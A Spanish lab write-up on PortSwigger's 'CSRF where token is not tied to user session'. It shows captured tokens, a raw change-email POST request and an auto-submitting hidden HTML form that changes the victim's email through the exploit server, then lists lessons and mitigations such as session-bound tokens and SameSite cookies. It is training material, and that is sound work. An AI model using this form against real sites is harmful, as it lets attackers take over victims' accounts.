---
title: "CSRF where token is not tied to user session"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "csrf-where-token-is-not-tied-to-user-session"
author: "Z4k7"
date: "2026-04-04"
year: "2026"
status: "pwned"
tags:
  - "CSRF"
techniques:
  - "CSRF Token Reuse"
  - "Token Reutilización"
  - "Tokens no vinculados a sesión"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF donde la aplicación implementa tokens CSRF, pero NO los vincula a la sesión del usuario. El atacante puede obtener un token válido de CUALQUIER usuario (incluyendo el suyo propio) y reutilizarlo para realizar CSRF contra otra víctima. Esto demuestra que los tokens CSRF DEBEN estar vinculados a la sesión para ser seguros.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Utiliza tokens para intentar prevenirlos, pero estos no están integrados en el sistema de gestión de sesiones del sitio.
          Para resolver el laboratorio, utiliza tu servidor de explotación para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del usuario.
          Dispones de dos cuentas en la aplicación que puedes usar para ayudarte a diseñar tu ataque. Las credenciales son las siguientes:
      - kind: "bullet"
        text: "wiener:peter"
      - kind: "bullet"
        text: "carlos:montoya"
      - kind: "callout"
        type: "info"
        label: "Pista"
        text: "No puedes registrar una dirección de correo electrónico que ya esté en uso por otro usuario. Si cambias tu dirección de correo electrónico mientras pruebas tu exploit, asegúrate de usar una dirección diferente para el exploit final que le envíes a la víctima."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404155723039.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Accedemos en el apartado de login para ingresar con los datos suministrados en el objetivo del laboratorio:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404155806408.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual. El objetivo es tratar de cambiar el correo de la víctima. Se validan las credenciales para los usuarios `wiener:peter` y `carlos:montoya`.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404155935818.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404160005162.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter y carlos:montoya"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab es diferente — tienes DOS cuentas. Eso es una pista: debes obtener el token de una cuenta y usarlo contra la otra. La pregunta clave: ¿los tokens son únicos POR USUARIO o son GLOBALES? Si son globales, cualquier token funciona."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultamos el código de la web el apartado del input que permite ingresar datos para el cambio del Email.
          Token de carlos:
      - kind: "code"
        lang: "HTML"
        code: |
          <div id="account-content">
              <p>Your username is: carlos</p>
          	<p>Your email is: <span id="user-email">carlos@carlos-montoya.net</span></p>
              <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                  <label>Email</label>
                  <input required="" type="email" name="email" value="">
                  <input required="" type="hidden" name="csrf" value="AE1tXwlBOZosdv0GNsaSUZN4d9iSSe2y">
                  <button class="button" type="submit"> Update email </button>
              </form>
          </div>
      - kind: "note"
        text: |
          Token de wiener:
      - kind: "code"
        lang: "HTML"
        code: |
          <div id="account-content">
              <p>Your username is: wiener</p>
              <p>Your email is: <span id="user-email">wiener@normal-user.net</span></p>
              <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                  <label>Email</label>
                  <input required="" type="email" name="email" value="">
                  <input required="" type="hidden" name="csrf" value="wYGjqvXwu0HTxAKYupBY8joKMC6YrkcN">
                  <button class="button" type="submit"> Update email </button>
              </form>
          </div>
      - kind: "note"
        text: |
          Los códigos anteriores nos permiten identificar que cada formulario de cambio de correo electrónico cuenta con su propio token CSRF.
          Observación crítica: Cada usuario tiene un token diferente:
      - kind: "bullet"
        text: "carlos: AE1tXwlBOZosdv0GNsaSUZN4d9iSSe2y"
      - kind: "bullet"
        text: "wiener: wYGjqvXwu0HTxAKYupBY8joKMC6YrkcN"
      - kind: "note"
        text: |
          La pregunta es: ¿puedo usar el token de carlos para cambiar el email de wiener? Si sí → los tokens no están vinculados a sesión.
      - kind: "callout"
        type: "warning"
        label: "Tokens no Vinculados a Sesión"
        text: "El servidor valida que el token sea válido, pero NO verifica que pertenezca al usuario actual. Esto significa que cualquier token válido, de cualquier usuario, funcionará para cambiar datos de OTRO usuario."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es un concepto crítico en seguridad: token binding. Los tokens CSRF deben estar vinculados a: 1. La sesión del usuario (por session ID) 2. El usuario específico 3. O ambos  Si no están vinculados, son reutilizables entre usuarios — lo que los hace prácticamente inútiles. ¿Entiendes por qué es importante este binding?"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Se emula el proceso de cambio de correo electrónico. Primero, probamos reutilizar el token de carlos en la cuenta de wiener.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404160945030.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404160958971.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/1.1
          Host: 0ac4004e0423a33c82de561900d70099.web-security-academy.net
          Cookie: session=LalrYOqPYmQTHbsGPq7p2wM0x48Z69PE
          Content-Length: 60
          Cache-Control: max-age=0
          Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
          Sec-Ch-Ua-Mobile: ?0
          Sec-Ch-Ua-Platform: "Windows"
          Accept-Language: es-419,es;q=0.9
          Origin: https://0ac4004e0423a33c82de561900d70099.web-security-academy.net
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          Sec-Fetch-Site: same-origin
          Sec-Fetch-Mode: navigate
          Sec-Fetch-User: ?1
          Sec-Fetch-Dest: document
          Referer: https://0ac4004e0423a33c82de561900d70099.web-security-academy.net/my-account?id=wiener
          Accept-Encoding: gzip, deflate, br
          Priority: u=0, i
          Connection: keep-alive
          
          email=hack%40gmail.com&csrf=wYGjqvXwu0HTxAKYupBY8joKMC6YrkcN
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404161038189.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Primera prueba: Intentamos usar el token de carlos (`AE1tXwlBOZosdv0GNsaSUZN4d9iSSe2y`) en la sesión de wiener:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404161454239.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ¡Funciona! El servidor acepta el token de carlos para cambiar el email de wiener. Esto confirma que los tokens NO están vinculados a sesión.
          Segunda prueba: Si intentamos usar el mismo token dos veces:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162203214.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El servidor detecta que el token ya fue usado y rechaza:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162250693.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Conclusión: Los tokens son únicos GLOBALMENTE y pueden reutilizarse entre usuarios, pero se invalidam después de una sola solicitud (one-time tokens).
          Para realizar el ataque CSRF, obtenemos un token válido de cualquier usuario y lo incluimos en el formulario:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162442896.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162501865.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "HTML"
        code: |
          <form class="login-form" name="change-email-form" action="https://0ac4004e0423a33c82de561900d70099.web-security-academy.net/my-account/change-email" method="POST">
          <input required type="hidden" name="csrf" value="ApLp4eWmOGhgOB0o1TYLkI0YERSZX4nM">
          <input type="email" name="email" value="hack@gmail.com" />
          </form>
          <script> 
          	  document.forms[0].submit(); 
          </script>
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — Token Reutilización"
        text: "1. Atacante obtiene un token válido (de su propia cuenta o página pública) 2. Token NO está vinculado a sesión específica 3. Atacante incluye ese token en formulario CSRF 4. Víctima visita la página, su navegador envía su PROPIA cookie de sesión 5. Token de atacante + Sesión de víctima = Válido (porque token no está vinculado) 6. Email cambiado ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es el concepto más importante de este lab: vincular tokens a sesión. El servidor debe verificar: - ¿El token existe? ✓ (lo hace) - ¿El token ya fue usado? ✓ (lo detecta) - ¿El token pertenece a ESTA sesión específica? ✗ (NO lo verifica) ← Aquí está el error"

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` para simular un servidor atacante:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162759974.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima. Para confirmar que la víctima realizó el cambio validamos en el apartado de LOG:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162854439.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se envía el formulario la víctima:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404162943899.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/file-20260404163001922.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el apartado de los log del servidor la víctima accede a la web y se realiza la modificación del correo.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El lab demuestra que la presencia de tokens NO es suficiente — deben estar correctamente vinculados a sesión. Este es uno de los errores más comunes en implementaciones CSRF débiles."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios, pero demuestra algo crítico: intercambiabilidad de tokens entre usuarios.
          En un escenario real donde:
      - kind: "bullet"
        text: "El atacante tiene acceso a una cuenta regular"
      - kind: "bullet"
        text: "Hay un usuario administrativo"
      - kind: "bullet"
        text: "Los tokens no están vinculados a sesión"
      - kind: "note"
        text: |
          El atacante podría potencialmente cambiar datos del admin usando un token de su propia cuenta.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Los tokens CSRF se llaman 'Anti-CSRF tokens' porque su propósito es demostrar que el usuario INTENTA la acción. Si cualquier usuario puede demostrar 'intención' con cualquier token, la protección se colapsa."

lessons:
  - 'Los tokens CSRF DEBEN estar vinculados a sesión: Un token sin binding es reutilizable y por tanto inútil.'
  - 'La existencia de validación ≠ validación correcta: El servidor valida tokens, pero de forma incompleta.'
  - 'Dos cuentas de prueba = investigación de binding: Cuando un lab te da dos cuentas, pregúntate: ¿puedo hacer X con cuenta A y afectar cuenta B?'
  - 'One-time tokens son una defensa adicional pero insuficiente: Previenen reutilización del MISMO token, pero no previenen reutilización entre usuarios.'
  - 'Token binding es estándar en frameworks modernos: Django, Rails, Spring lo hacen correctamente por defecto.'
  - 'Esto es más crítico que labs anteriores: No es un bypass de defensa incompleta — es una defensa que aparenta funcionar pero falla fundamentalmente.'
mitigation:
  - 'Vincular token a session ID: Token debe ser válido SOLO para esa sesión específica (server-side).'
  - 'Vincular token a usuario: O almacenar en sesión y validar que el usuario en la cookie = usuario del token.'
  - 'Usar framework CSRF protection estándar: No implementar desde cero.'
  - 'Validar token + session consistency: Si hay mismatch → rechazar.'
  - 'Implementar SameSite cookies como segunda línea: Aunque haya binding, SameSite previene el envío de cookies cross-site.'
  - 'Logging: Registrar intentos de reutilización de tokens.'
---
